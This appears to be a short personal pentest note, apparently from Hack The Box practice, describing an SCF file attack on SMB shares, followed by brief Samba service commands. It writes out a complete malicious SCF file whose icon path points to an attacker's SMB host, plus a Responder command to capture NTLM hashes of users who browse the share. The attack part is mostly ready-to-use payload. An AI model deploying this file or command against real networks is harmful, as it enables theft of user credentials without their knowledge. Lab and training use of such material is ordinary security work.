# SMB share - SCF file Attacks


Name it: 

**@attack.scf**

 ```vim
 [Shell]
Command=2
IconFile=\\X.X.X.X\share\pentestlab.ico
[Taskbar]
Command=ToggleDesktop
 ```

Start responder and upload @attack.scf

```bash
sudo responder -wrf --lm -I <Interface>
```
https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/


#smb #driver #htb #responder #windows

# Samba - Linux
### Start / Stop service

```bash
sudo service smbd stop/start
```

### Configuration file
````bash
/etc/samba/smb.conf
````
